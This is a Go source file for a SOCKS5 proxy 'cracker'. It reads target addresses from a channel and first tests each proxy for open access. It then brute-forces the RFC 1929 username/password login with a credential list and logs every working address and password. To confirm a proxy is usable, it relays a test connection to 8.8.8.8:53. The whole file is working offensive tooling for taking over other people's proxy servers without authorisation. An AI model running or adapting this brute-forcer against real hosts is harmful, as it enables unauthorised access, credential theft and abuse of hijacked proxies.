package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"scanner"
)

type cracker struct {
	address    <-chan string
	dialer     *scanner.Dialer
	timeout    time.Duration
	auths      []*auth
	authsLen   int
	stopSignal chan struct{}
	wg         *sync.WaitGroup
}

func (c *cracker) Do() {
	defer c.wg.Done()
	var address string
	for {
		select {
		case address = <-c.address:
			if address == "" {
				return
			}
			c.crack(address)
		case <-c.stopSignal:
			return
		}
	}
}

func (c *cracker) crack(address string) {
	// no password
	err := c.connect(address, "", "")
	if err == nil {
		log.Print(address + "\r\n")
		return
	}
	// with password
	for i := 0; i < c.authsLen; i++ {
		select {
		case <-c.stopSignal:
			return
		default:
		}
		user := c.auths[i].Username
		pass := c.auths[i].Password
		err = c.connect(address, user, pass)
		if err != nil {
			if err != errInvalidUserPass {
				return
			}
		} else {
			log.Printf("%s %s %s\r\n", address, user, pass)
			return
		}
	}
}

const (
	version5 uint8 = 0x05
	// auth method
	notRequired         uint8 = 0x00
	usernamePassword    uint8 = 0x02
	noAcceptableMethods uint8 = 0xFF
	// auth
	usernamePasswordVersion uint8 = 0x01
	statusSucceeded         uint8 = 0x00
	// connect
	reserve uint8 = 0x00
	connect uint8 = 0x01
	ipv4    uint8 = 0x01
	// reply
	succeeded uint8 = 0x00
)

var (
	errNoAcceptableMethods = errors.New("no acceptable authentication methods")
	errInvalidUserPass     = errors.New("invalid username/password")
)

type timeoutConn struct {
	timeout time.Duration
	net.Conn
}

func (c *timeoutConn) Read(b []byte) (n int, err error) {
	_ = c.SetReadDeadline(time.Now().Add(c.timeout))
	return c.Conn.Read(b)
}

func (c *timeoutConn) Write(b []byte) (n int, err error) {
	_ = c.SetWriteDeadline(time.Now().Add(c.timeout))
	return c.Conn.Write(b)
}

func (c *cracker) connect(address, username, password string) error {
	conn, err := c.dialer.Dial("tcp", address)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	conn = &timeoutConn{timeout: c.timeout, Conn: conn}
	// request authentication
	buffer := bytes.Buffer{}
	buffer.WriteByte(version5)
	if username == "" {
		buffer.WriteByte(1)
		buffer.WriteByte(notRequired)
	} else {
		buffer.WriteByte(2)
		buffer.WriteByte(notRequired)
		buffer.WriteByte(usernamePassword)
	}
	_, err = conn.Write(buffer.Bytes())
	if err != nil {
		return err
	}
	resp := make([]byte, 2)
	_, err = io.ReadFull(conn, resp)
	if err != nil {
		return err
	}
	if resp[0] != version5 {
		return fmt.Errorf("unexpected protocol version %d", resp[0])
	}
	am := resp[1]
	if am == noAcceptableMethods {
		return errNoAcceptableMethods
	}
	// authenticate
	switch am {
	case notRequired:
	case usernamePassword:
		if len(username) == 0 || len(username) > 255 {
			return errors.New("invalid username length")
		}
		// https://www.ietf.org/rfc/rfc1929.txt
		buffer.Reset()
		buffer.WriteByte(usernamePasswordVersion)
		buffer.WriteByte(byte(len(username)))
		buffer.WriteString(username)
		buffer.WriteByte(byte(len(password)))
		buffer.WriteString(password)
		_, err = conn.Write(buffer.Bytes())
		if err != nil {
			return err
		}
		resp = make([]byte, 2)
		_, err = io.ReadFull(conn, resp)
		if err != nil {
			return err
		}
		if resp[0] != usernamePasswordVersion {
			return errors.New("invalid username/password version")
		}
		if resp[1] != statusSucceeded {
			return errInvalidUserPass
		}
	default:
		return fmt.Errorf("unsupported authentication method %d", am)
	}
	// check & send test connect target
	// 8.8.8.8:53
	buffer.Reset()
	buffer.WriteByte(version5)
	buffer.WriteByte(connect)
	buffer.WriteByte(reserve)
	buffer.WriteByte(ipv4)
	buffer.Write([]byte{8, 8, 8, 8})
	buffer.Write([]byte{0, 53})
	_, err = conn.Write(buffer.Bytes())
	if err != nil {
		return err
	}
	// receive reply
	resp = make([]byte, 4)
	_, err = io.ReadFull(conn, resp)
	if err != nil {
		return err
	}
	if resp[0] != version5 {
		return fmt.Errorf("unexpected protocol version %d", resp[0])
	}
	if resp[1] != succeeded {
		return errors.New("connect failed")
	}
	if resp[2] != 0 {
		return errors.New("non-zero reserved field")
	}
	// receive ipv4
	resp = make([]byte, net.IPv4len+2) // ipv4 + ip + port
	_, err = io.ReadFull(conn, resp)
	return err
}
